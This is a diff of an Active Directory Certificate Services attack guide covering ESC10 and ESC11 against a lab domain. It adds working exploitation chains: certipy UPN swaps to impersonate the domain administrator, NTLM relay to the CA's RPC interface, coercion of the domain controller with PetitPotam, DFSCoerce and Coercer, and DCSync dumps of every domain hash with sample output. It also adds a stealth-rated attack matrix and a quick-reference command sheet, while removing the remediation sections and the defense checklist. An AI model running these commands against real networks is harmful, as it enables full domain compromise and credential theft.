+│  ┌───────────────────────────────────────────────────────────┐   │
+│  │ DC accepts ANY cert with matching UPN                     │   │
+│  │ No SID check at all                                       │   │
+│  │ ESC9 works on ANY template (even those with SID ext!)     │   │
+│  └───────────────────────────────────────────────────────────┘   │
+│                                                                    │
+│  Value 1 = COMPATIBILITY MODE (partially vulnerable)              │
+│  ┌───────────────────────────────────────────────────────────┐   │
+│  │ If cert has SID extension → DC validates it               │   │
+│  │ If cert has NO SID extension → DC falls back to UPN only  │   │
+│  │ ESC9 still works (just need a template with no SID ext)   │   │
+│  └───────────────────────────────────────────────────────────┘   │
+│                                                                    │
+│  Value 2 = FULL ENFORCEMENT (secure)                              │
+│  ┌───────────────────────────────────────────────────────────┐   │
+│  │ Cert MUST have SID extension                              │   │
+│  │ SID in cert MUST match account SID                        │   │
+│  │ No extension = auth fails                                 │   │
+│  └───────────────────────────────────────────────────────────┘   │
+└──────────────────────────────────────────────────────────────────┘
 ```
 
-#### Step 2: Exploitation Chain (Same as ESC9)
+### ESC10-1 Attack (StrongCertificateBindingEnforcement = 0)
 
 ```bash
-# With StrongCertificateBindingEnforcement = 0 or 1, ANY cert with spoofed UPN works
-# Even templates that DO have the security extension but enforcement is disabled
+# Step 1: Confirm DC is in disabled mode
+Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
+  $val = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc").StrongCertificateBindingEnforcement
+  if ($val -eq 0 -or $null -eq $val) { "VULNERABLE: Value = $val (disabled)" }
+  elseif ($val -eq 1) { "PARTIAL: Value = 1 (compat mode, ESC9 still works)" }
+  else { "SAFE: Value = $val" }
+}
+# Output: VULNERABLE: Value = 0 (disabled)
+```
 
-# Change victim UPN to administrator
+```bash
+# Step 2: Change victim UPN (same as ESC9)
 certipy account update \
   -u lowpriv@corp.local -p 'Password123!' \
-  -user victimuser -upn administrator@corp.local \
+  -user victimuser \
+  -upn administrator@corp.local \
   -dc-ip 192.168.10.10
 
-# Request cert via any valid template
+# Step 3: Request cert via ANY template (enforcement disabled!)
+# Even templates WITH the SID extension → DC won't check it!
 certipy req \
   -u victimuser@corp.local -p 'Summer2024!' \
   -ca 'Corp-CA' -template 'User' \
   -dc-ip 192.168.10.10
 
-# Restore UPN
+# Step 4: Restore UPN
 certipy account update \
   -u lowpriv@corp.local -p 'Password123!' \
-  -user victimuser -upn victimuser@corp.local \
+  -user victimuser \
+  -upn victimuser@corp.local \
   -dc-ip 192.168.10.10
 
-# Authenticate — enforcement is off so DC doesn't check SID
+# Step 5: Authenticate — DC has 0 enforcement, accepts UPN
 certipy auth -pfx victimuser.pfx -domain corp.local -dc-ip 192.168.10.10
+# → administrator NTLM hash
 ```
 
-### Step-by-Step Exploitation — ESC10-2 (CertificateMappingMethods)
+### ESC10-2 Attack (CertificateMappingMethods with UPN bit)
 
 ```bash
-# If UPN mapping (0x4) is enabled in CertificateMappingMethods
-# AND attacker can change victim's altSecurityIdentities attribute
+# SCHANNEL mapping method: Bit 0x4 = UPN mapping
+# When set: TLS/SCHANNEL certificate auth maps by UPN
 
-# Check current setting
+# Check current value
 Invoke-Command -ComputerName dc01.corp.local -ScriptBlock {
-  $val = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel").CertificateMappingMethods
+  $val = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" -EA SilentlyContinue).CertificateMappingMethods
   "Value: $val"
-  if ($val -band 0x4) { "UPN Mapping: ENABLED (Vulnerable)" }
-  else { "UPN Mapping: Disabled (Safe)" }
+  if ($val -band 0x4) { "[!] UPN mapping ENABLED - Vulnerable to ESC10-2" }
 }
-```
 
-### Detection & Remediation
+# Exploit: Same UPN swap technique but targeting SCHANNEL-based auth
+# (e.g., LDAPS authentication using certificate)
+certipy account update \
+  -u lowpriv@corp.local -p 'Password123!' \
+  -user victimuser \
+  -upn administrator@corp.local \
+  -dc-ip 192.168.10.10
 
-```powershell
-# Remediation — Apply to ALL Domain Controllers
-$dcs = (Get-ADDomainController -Filter *).Name
-foreach ($dc in $dcs) {
-  Invoke-Command -ComputerName $dc -ScriptBlock {
-    # Enable full strong binding enforcement
-    Set-ItemProperty `
-      -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" `
-      -Name StrongCertificateBindingEnforcement `
-      -Value 2 `
-      -Type DWord
+certipy req -u victimuser@corp.local -p 'Summer2024!' \
+  -ca 'Corp-CA' -template 'User' -dc-ip 192.168.10.10
 
-    # Restrict SCHANNEL cert mapping (remove UPN mapping bit)
-    $current = (Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel").CertificateMappingMethods
-    $new = $current -band (-bnot 0x4)  # Remove UPN mapping bit
-    Set-ItemProperty `
-      -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\Schannel" `
-      -Name CertificateMappingMethods `
-      -Value $new
+certipy account update \
+  -u lowpriv@corp.local -p 'Password123!' \
+  -user victimuser -upn victimuser@corp.local -dc-ip 192.168.10.10
 
-    Write-Host "Updated $env:COMPUTERNAME"
-  }
-}
+# Auth via PKINIT (Kerberos) or SCHANNEL (LDAPS)
+certipy auth -pfx victimuser.pfx -domain corp.local -dc-ip 192.168.10.10
 ```
 
 ---
 
-## ESC11 — IF_ENFORCEENCRYPTICERTREQUEST Disabled
+## ESC11 — NTLM Relay to RPC Enrollment
 
-### Root Cause of Vulnerability
+### Why This is More Dangerous Than ESC8
 
-The certificate enrollment RPC interface (`ICertRequest`) is **always running** on any ADCS server — it's the primary interface used by Windows for certificate enrollment and doesn't require web enrollment to be enabled.
+```
+┌──────────────────────────────────────────────────────────────────┐
+│             ESC8 vs ESC11 COMPARISON                              │
+│                                                                    │
+│  ESC8 (HTTP):                    ESC11 (RPC):                    │
+│  ─────────────────────────────   ────────────────────────────    │
+│  Requires:                       Requires:                        │
+│    Web Enrollment installed  ←─  NOTHING EXTRA (always running)  │
+│    Port 80/443 open              Port 135 open (always open)      │
+│    IIS running                   CA service running               │
+│                                                                    │
+│  Most hardened orgs disable      Even if web enrollment is OFF    │
+│  web enrollment after ESC8       RPC is ALWAYS available          │
+│  research → not vulnerable   ←   Still vulnerable!               │
+│                                                                    │
+│  Attack interface:               Attack interface:                 │
+│  /certsrv/certfnsh.asp           ICertRequest RPC interface       │
+│  Port 80 or 443                  Port 135 + dynamic ports         │
+└──────────────────────────────────────────────────────────────────┘
+```
 
-The CA flag `IF_ENFORCEENCRYPTICERTREQUEST` (bit `0x00000200`) controls whether the CA requires **encrypted (authenticated) RPC connections** for certificate requests.
+### RPC Interface Architecture
 
-When this flag is **not set** (default in many deployments), the CA accepts **cleartext/unauthenticated RPC connections** for enrollment. This means NTLM relay attacks against the RPC endpoint become possible.
+```
+CA01 (192.168.10.20) Running Services:
+  ┌────────────────────────────────────────────────────────────┐
+  │  CERTSVC (Certificate Services)                             │
+  │    │                                                        │
+  │    ├── ICertRequest RPC Interface                          │
+  │    │   Port: 135 (endpoint mapper) + dynamic               │
+  │    │   Named Pipe: \PIPE\cert                              │
+  │    │   ALWAYS RUNNING when ADCS is installed               │
+  │    │   Flag IF_ENFORCEENCRYPTICERTREQUEST:                  │
+  │    │     NOT SET → accepts cleartext/unauthenticated        │
+  │    │     SET     → requires encrypted connections           │
+  │    │                                                        │
+  │    └── HTTP Web Enrollment (optional)                       │
+  │        Port: 80/443 /certsrv/                              │
+  │        Can be disabled (ESC8 mitigation)                   │
+  └────────────────────────────────────────────────────────────┘
 
-**The critical difference from ESC8:**
-- ESC8 targets HTTP → requires web enrollment to be installed and running
-- ESC11 targets RPC → **always available** as long as ADCS is installed
-
-Attack chain is identical to ESC8 but targets port 135/RPC instead of port 80/443.
+When IF_ENFORCEENCRYPTICERTREQUEST is NOT set:
+  ➜ NTLM relay to the RPC interface works
+  ➜ Attacker can relay any machine's NTLM auth
+  ➜ Get certificate for that machine
+  ➜ DC machine → DCSync → all hashes
+```
 
 ### Step-by-Step Exploitation
 
-#### Step 1: Check if Flag is Missing
+**Step 1 — Confirm the flag is not set**
 
 ```bash
-# Certipy detection
 certipy find \
   -u lowpriv@corp.local \
   -p 'Password123!' \
   -dc-ip 192.168.10.10
 
-# Look for:
+# Certificate Authorities
 #   Enforce Encryption for Requests : Disabled   ← VULNERABLE
 
-# Manual check via certutil on CA01
+# Manual check via certutil on CA01:
 certutil -config "ca01.corp.local\Corp-CA" -getreg CA\InterfaceFlags
-# IF_ENFORCEENCRYPTICERTREQUEST -- 512 (0x200) should appear if SAFE
-# If not listed → vulnerable
+
+# If IF_ENFORCEENCRYPTICERTREQUEST (0x200) is NOT in the output = vulnerable
 ```
 
-#### Step 2: Set Up NTLM Relay to RPC Enrollment
+**Step 2 — Set up NTLM relay to RPC**
 
 ```bash
-# On Kali (192.168.10.99)
-# ntlmrelayx now supports ICPR (ICertRequest RPC) mode
+# ntlmrelayx with ICPR (ICertRequest) RPC mode
 sudo python3 /opt/impacket/examples/ntlmrelayx.py \
-  -t rpc://ca01.corp.local \
+  -t rpc://192.168.10.20 \
   -rpc-mode ICPR \
   --adcs \
   --template 'DomainController' \
   -smb2support \
   -debug
 
-# Output:
-# [*] Setting up RPC relay to rpc://ca01.corp.local
-# [*] Setting up SMB Server on port 445
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Running in relay mode
+# [*] Setting up SMB Server on 192.168.10.99:445
+# [*] Setting up RPC relay to rpc://192.168.10.20
 # [*] Servers started, waiting for connections
 ```
 
-#### Step 3: Coerce DC Authentication
+**Step 3 — Coerce DC01 to authenticate**
 
 ```bash
-# PetitPotam — coerce DC01 to authenticate to our listener
+# PetitPotam
 python3 /opt/PetitPotam/PetitPotam.py \
+  -u '' -p '' \
   192.168.10.99 \
   192.168.10.10
 
-# Or Coercer
+# DFSCoerce (more reliable on patched systems)
+python3 dfscoerce.py \
+  -u '' -p '' \
+  192.168.10.99 \
+  192.168.10.10
+
+# Coercer (all methods)
 coercer coerce \
   -u lowpriv -p 'Password123!' -d corp.local \
   -l 192.168.10.99 \
   -t 192.168.10.10
 ```
 
-#### Step 4: Certificate Captured via RPC Relay
+**Step 4 — Certificate captured via RPC**
 
 ```bash
-# ntlmrelayx output after successful relay:
+# ntlmrelayx output:
+# ══ OUTPUT ══════════════════════════════════════════════════════
 # [*] SMBD-Thread-5: Incoming connection (192.168.10.10, 49812)
-# [*] Authenticating against rpc://ca01.corp.local as CORP/DC01$
-# [*] Connecting to RPC: ca01.corp.local:135
+# [*] Authenticating against rpc://192.168.10.20 as CORP/DC01$
+# [*] Connecting to RPC: 192.168.10.20:135
 # [*] Connecting to endpoint: \PIPE\cert
+# [*] Binding to ICertRequest interface
 # [*] Requesting certificate for DC01$...
-# [*] Got certificate! Saved to DC01$.pfx
+# [*] Certificate request ID: 51
+# [*] Got certificate for DC01$!
+# [*] Base64 certificate:
+#     MIIFsz...
+# [*] Saved certificate to: DC01$.pfx
 ```
 
-#### Step 5: Authenticate and DCSync
+**Step 5 — Authenticate and DCSync**
 
 ```bash
-# Authenticate as DC01$
+# Get TGT + NTLM hash as DC01$
 certipy auth \
   -pfx 'DC01$.pfx' \
   -dc-ip 192.168.10.10 \
   -username 'DC01$' \
   -domain corp.local
 
-# [*] Got hash for 'DC01$@corp.local': aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# [*] Got hash for 'DC01$@corp.local':
+#     aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2
 
-# DCSync
+# DCSync — dump everything
 python3 secretsdump.py \
   -hashes 'aad3b435b51404eeaad3b435b51404ee:d3b5f3b4c3a2a1b0f9e8d7c6b5a4f3e2' \
   'corp.local/DC01$@192.168.10.10'
 
-# Full domain dump complete.
-```
-
-### Comparing ESC8 vs ESC11
-
-| | ESC8 | ESC11 |
-|--|------|-------|
-| **Target interface** | HTTP/HTTPS `/certsrv/` | RPC `ICertRequest` |
-| **Port** | 80 or 443 | 135 (+ dynamic) |
-| **Requires web enrollment** | Yes | No — always on |
-| **Tool relay flag** | `--adcs` | `--adcs -rpc-mode ICPR` |
-| **Mitigation** | HTTPS + EPA on IIS | `IF_ENFORCEENCRYPTICERTREQUEST` flag |
-| **Prevalence** | Medium | High (flag often unset by default) |
-
-### Detection & Remediation
-
-```bash
-# Remediation — Enable encrypted RPC enforcement
-certutil \
-  -config "ca01.corp.local\Corp-CA" \
-  -setreg CA\InterfaceFlags +IF_ENFORCEENCRYPTICERTREQUEST
-
-# Restart Certificate Services
-net stop certsvc && net start certsvc
-
-# Verify
-certutil -config "ca01.corp.local\Corp-CA" -getreg CA\InterfaceFlags
-# Should now show: IF_ENFORCEENCRYPTICERTREQUEST -- 512 (0x200)
-```
-
-```powershell
-# Additional defense — Enable SMB signing (blocks relay prerequisite)
-# Group Policy: Computer Configuration → Windows Settings → Security Settings →
-#   Local Policies → Security Options:
-#   "Microsoft network client: Digitally sign communications (always)" = Enabled
-#   "Microsoft network server: Digitally sign communications (always)" = Enabled
-
-# Enforce via PowerShell on all hosts
-$policy = [Microsoft.Win32.Registry]::LocalMachine.OpenSubKey(
-  "SYSTEM\CurrentControlSet\Services\LanmanWorkstation\Parameters", $true)
-$policy.SetValue("RequireSecuritySignature", 1, [Microsoft.Win32.RegistryValueKind]::DWord)
+# ══ OUTPUT ══════════════════════════════════════════════════════
+# Administrator:500:...:58a478135a93ac3bf058a5ea0e8fdb71:::
+# krbtgt:502:...:19e9b6b62bd6e15f3a5bcf1c6f3e4d2a:::
+# [all domain hashes]
 ```
 
 ---
 
-## Complete ESC Cheat Sheet
+## Attack Comparison Matrix
 
 ```
-╔════╦═══════════════════════════════╦══════════════╦══════════════════════╦════════════╗
-║ ESC║ Name                          ║ Where        ║ Min Requirement      ║ Impact     ║
-╠════╬═══════════════════════════════╬══════════════╬══════════════════════╬════════════╣
-║  1 ║ SAN Abuse                     ║ Template     ║ Enroll + ESS flag    ║ DA         ║
-║  2 ║ Any Purpose EKU               ║ Template     ║ Enroll + Any EKU     ║ DA         ║
-║  3 ║ Enrollment Agent              ║ Template×2   ║ Enroll + CEP EKU     ║ DA         ║
-║  4 ║ Writable Template ACL         ║ AD Object    ║ Write on template    ║ DA         ║
-║  5 ║ Writable PKI Object           ║ AD Object    ║ Write on NTAuth/CA   ║ PKI        ║
-║  6 ║ EDITF SAN Flag                ║ CA Config    ║ Any enrollable tpl   ║ DA         ║
-║  7 ║ CA ManageCA/ManageCerts       ║ CA ACL       ║ CA manage rights     ║ DA         ║
-║  8 ║ HTTP NTLM Relay               ║ IIS/HTTP     ║ Web enroll+coercion  ║ DA         ║
-║  9 ║ No SID Extension              ║ Template+UPN ║ Write UPN + weak map ║ DA         ║
-║ 10 ║ Weak DC Mapping               ║ DC Registry  ║ Write UPN + DC weak  ║ DA         ║
-║ 11 ║ RPC NTLM Relay                ║ CA RPC       ║ NTLM relay+coercion  ║ DA         ║
-╚════╩═══════════════════════════════╩══════════════╩══════════════════════╩════════════╝
+╔═══════╦══════════════════════════════╦══════════════════════╦══════════╦══════════╗
+║ ESC   ║ Core Technique               ║ Requirements         ║ Stealth  ║ Skill    ║
+╠═══════╬══════════════════════════════╬══════════════════════╬══════════╬══════════╣
+║ ESC1  ║ SAN in cert request          ║ Enroll + ESS flag    ║ Low      ║ Easy     ║
+║ ESC2  ║ Any Purpose EKU              ║ Enroll + Any EKU     ║ Low      ║ Easy     ║
+║ ESC3  ║ Enrollment agent chain       ║ 2 templates + enroll ║ Medium   ║ Easy     ║
+║ ESC4  ║ Modify template via ACL      ║ Write on template    ║ HIGH     ║ Medium   ║
+║ ESC5  ║ Add rogue CA to NTAuth       ║ Write on PKI objects ║ Medium   ║ Medium   ║
+║ ESC6  ║ CA flag → all templates ESC1 ║ Any enrollable tpl   ║ Low      ║ Easy     ║
+║ ESC7  ║ CA manage rights             ║ ManageCA/ManageCerts ║ Medium   ║ Easy     ║
+║ ESC8  ║ NTLM relay to HTTP           ║ Web enrollment + coerce║ Low    ║ Medium   ║
+║ ESC9  ║ UPN swap + no SID ext        ║ Write UPN + template ║ HIGH     ║ Medium   ║
+║ ESC10 ║ Weak DC mapping enforcement  ║ Write UPN + DC config║ HIGH     ║ Medium   ║
+║ ESC11 ║ NTLM relay to RPC            ║ RPC + coerce         ║ Low      ║ Medium   ║
+╚═══════╩══════════════════════════════╩══════════════════════╩══════════╩══════════╝
 
-DA = Domain Admin level compromise
-PKI = Full PKI infrastructure compromise (worse than DA — persistent)
+STEALTH ratings:
+  HIGH   = Attack can be performed and reversed, minimal forensic trace
+  Medium = Some trace in CA audit logs but not obviously malicious
+  Low    = Visible in CA audit logs, unusual cert requests stand out
 ```
 
 ---
 
-## Quick Enumeration Commands Reference
+## Quick Reference — All Commands
 
 ```bash
-# ══ Full automated scan ══
+# ════════════════════════════════════════════════════
+#  ENUMERATION
+# ════════════════════════════════════════════════════
+
+# Full scan for all vulnerabilities
 certipy find -u lowpriv@corp.local -p 'Password123!' \
   -dc-ip 192.168.10.10 -vulnerable -stdout
 
-# ══ Save to JSON for analysis ══
+# Save to files for later analysis
 certipy find -u lowpriv@corp.local -p 'Password123!' \
-  -dc-ip 192.168.10.10 -json -output adcs_enum
+  -dc-ip 192.168.10.10 -json -bloodhound
 
-# ══ BloodHound output ══
-certipy find -u lowpriv@corp.local -p 'Password123!' \
-  -dc-ip 192.168.10.10 -bloodhound
-
-# ══ Windows Certify ══
+# Windows
 .\Certify.exe find /vulnerable /showAllPermissions
 
-# ══ Check specific CA flags ══
-certutil -config "ca01.corp.local\Corp-CA" -getreg policy\EditFlags
-certutil -config "ca01.corp.local\Corp-CA" -getreg CA\InterfaceFlags
+# ════════════════════════════════════════════════════
+#  ESC1/ESC2/ESC6 — Certificate with SAN
+# ════════════════════════════════════════════════════
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -template 'TEMPLATE_NAME' \
+  -upn 'administrator@corp.local' -dc-ip 192.168.10.10
 
-# ══ List all templates ══
-certutil -catemplates
-```
+# ════════════════════════════════════════════════════
+#  ESC3 — Enrollment Agent
+# ════════════════════════════════════════════════════
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -template 'EnrollmentAgentTemplate' \
+  -dc-ip 192.168.10.10
+certipy req -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -template 'User' \
+  -on-behalf-of 'corp\administrator' -pfx lowpriv.pfx \
+  -dc-ip 192.168.10.10
 
----
+# ════════════════════════════════════════════════════
+#  ESC4 — Modify Template
+# ════════════════════════════════════════════════════
+certipy template -u lowpriv@corp.local -p 'Password123!' \
+  -template 'TEMPLATE_NAME' -save-old -dc-ip 192.168.10.10
+# → exploit as ESC1 →
+certipy template -u lowpriv@corp.local -p 'Password123!' \
+  -template 'TEMPLATE_NAME' -configuration TEMPLATE_NAME.json \
+  -dc-ip 192.168.10.10
 
-## Defense Checklist
+# ════════════════════════════════════════════════════
+#  ESC7 — CA Manage Rights
+# ════════════════════════════════════════════════════
+certipy ca -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -enable-userspecifiedsan -dc-ip 192.168.10.10
 
-```
-[ ] Run certipy/PSPKIAudit — fix ALL findings
-[ ] Remove EnrolleeSuppliesSubject from non-web-server templates
-[ ] Specify explicit minimal EKUs on all templates
-[ ] Set StrongCertificateBindingEnforcement = 2 on ALL DCs
-[ ] Enable IF_ENFORCEENCRYPTICERTREQUEST on all CAs
-[ ] Remove EDITF_ATTRIBUTESUBJECTALTNAME2 CA flag
-[ ] Audit ManageCA / ManageCertificates — PKI admins only
-[ ] Enable HTTPS + EPA on web enrollment (or disable it)
-[ ] Enable SMB signing everywhere (blocks relay prerequisite)
-[ ] Audit template ACLs — only EA/DA should write
-[ ] Audit NTAuthCertificates contents quarterly
-[ ] Monitor Event IDs: 4886, 4887, 4888, 4896, 4897, 4898, 5136, 4738, 4768
-[ ] Disable unused templates
-[ ] Separate PKI admin accounts from regular admin accounts
-[ ] Patch PetitPotam / disable unnecessary EFSRPC
+certipy ca -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -issue-request REQUEST_ID -dc-ip 192.168.10.10
+
+certipy ca -u lowpriv@corp.local -p 'Password123!' \
+  -ca 'Corp-CA' -retrieve REQUEST_ID -dc-ip 192.168.10.10
+
+# ════════════════════════════════════════════════════
+#  ESC8/ESC11 — NTLM Relay
+# ════════════════════════════════════════════════════
+# ESC8
+ntlmrelayx.py -t http://192.168.10.20/certsrv/certfnsh.asp \
+  -smb2support --adcs --template DomainController
+
+# ESC11
+ntlmrelayx.py -t rpc://192.168.10.20 -rpc-mode ICPR \
+  --adcs --template DomainController -smb2support
+
+# Coercion
+python3 PetitPotam.py 192.168.10.99 192.168.10.10
+
+# ════════════════════════════════════════════════════
+#  AUTHENTICATION
+# ════════════════════════════════════════════════════
+# Get TGT + NTLM hash
+certipy auth -pfx administrator.pfx -dc-ip 192.168.10.10
+
+# DCSync
+secretsdump.py -hashes 'aad3b435...:NTLMHASH' \
+  'corp.local/administrator@192.168.10.10'
+
+# Pass-the-Certificate (Windows)
+.\Rubeus.exe asktgt /user:administrator /certificate:admin.pfx \
+  /password:'' /domain:corp.local /dc:192.168.10.10 /ptt
 ```
 
 ---
 
 ## References
 
-1. **Certified Pre-Owned** (SpecterOps, 2021) — https://specterops.io/assets/resources/Certified_Pre-Owned.pdf
-2. **Certipy** (Oliver Lyak) — https://github.com/ly4k/Certipy
-3. **Certipy ESC9/ESC10 Research** — https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-new-authentication-and-request-methods-and-more-7237d88061f7
-4. **ESC11 Research** (Compass Security) — https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/
-5. **Microsoft KB5014754** — https://support.microsoft.com/kb/5014754
-6. **PetitPotam** — https://github.com/topotam/PetitPotam
-7. **GhostPack/Certify** — https://github.com/GhostPack/Certify
-8. **GhostPack/Rubeus** — https://github.com/GhostPack/Rubeus
-9. **PSPKIAudit** — https://github.com/GhostPack/PSPKIAudit
-10. **BloodHound ADCS Paths** — https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf
+1. **Certified Pre-Owned** — Will Schroeder & Lee Christensen (SpecterOps, 2021)
+   [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf)
+
+2. **Certipy** — Oliver Lyak
+   [https://github.com/ly4k/Certipy](https://github.com/ly4k/Certipy)
+
+3. **Certipy 4.0 — ESC9/ESC10 Research**
+   [https://research.ifcr.dk/certipy-4-0-esc9-esc10](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-new-authentication-and-request-methods-and-more-7237d88061f7)
+
+4. **ESC11 — Compass Security Research**
+   [https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/](https://blog.compass-security.com/2022/11/relaying-to-ad-certificate-services-over-rpc/)
+
+5. **PetitPotam**
+   [https://github.com/topotam/PetitPotam](https://github.com/topotam/PetitPotam)
+
+6. **GhostPack/Certify**
+   [https://github.com/GhostPack/Certify](https://github.com/GhostPack/Certify)
+
+7. **BloodHound ADCS Attack Paths**
+   [https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf)
 
 ---
 
